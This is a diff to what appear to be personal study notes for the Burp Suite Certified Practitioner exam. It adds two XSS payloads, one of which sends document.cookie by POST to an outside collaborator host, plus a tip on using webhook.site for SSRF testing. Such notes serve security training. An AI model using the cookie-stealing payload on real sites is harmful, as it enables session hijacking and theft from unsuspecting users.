@@ -6,4 +6,8 @@
 
 ![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/12554a2b-795e-4135-88eb-19db2d510fae)
 
+- Various XSS Payloads:
+  - `<script>fetch("https://5mss4wrjzbfwlhwjbtrnuba4evkm8ew3.rsmcollaborator.com",{method:'POST', body:document.cookie});</script>`
+  - `<img src="http://url.to.file.which/not.exist" onerror=window.open("https://www.google.com","xss",'height=500,width=500');>`
+
 - [webhook.site](webhook.site) can be utilized for SSRF testing outside of Burp Suite collaborator. 
